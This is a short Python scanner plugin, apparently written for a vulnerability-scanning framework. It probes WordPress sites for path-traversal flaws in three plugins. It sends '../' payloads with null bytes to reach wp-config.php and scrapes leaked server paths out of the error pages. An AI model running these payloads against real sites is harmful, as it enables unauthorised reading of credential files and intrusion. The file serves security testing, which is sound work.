#!/usr/bin/python
#-*- coding: utf-8 -*-
#Refer：https://www.exploit-db.com/exploits/38868/,https://www.bugscan.net/#!/x/23184,https://www.exploit-db.com/exploits/38867/
#__Author__ = 这个程序员不太冷

import re
def assign(service, arg):
    if service == "wordpress":
        return True, arg 	

def audit(arg):
    payload1='wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../../../../../wp-config.php%00'
    payload2='wp-content/plugins/sell-downloads/sell-downloads.php?file=../../../../../../../../.././wp-config.php%00'
    payload3='wp-content/plugins/advanced-uploader/upload.php?destinations=../../../../../../../../../wp-config.php%00'
    verify_url = arg  + payload1
    code, head, res, errcode, _ = curl.curl(verify_url)
    path=re.findall(r'in <b>(.+?Miranda.class.php)</b>',res)
    if len(path)!=0:
        security_info(path[0])
    verify_url = arg  + payload2
    code, head, res, errcode, _ = curl.curl(verify_url)
    path=re.findall(r'in <b>(.+?sell-downloads.php)</b>',res)
    if len(path)!=0:
        security_info(path[0])
    verify_url = arg  + payload3
    code, head, res, errcode, _ = curl.curl(verify_url)
    path=re.findall(r'in <b>(.+?upload.php)</b>',res)
    if len(path)!=0:
        security_info(path[0])
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress','http://127.0.0.1:8080/wordpress/')[1])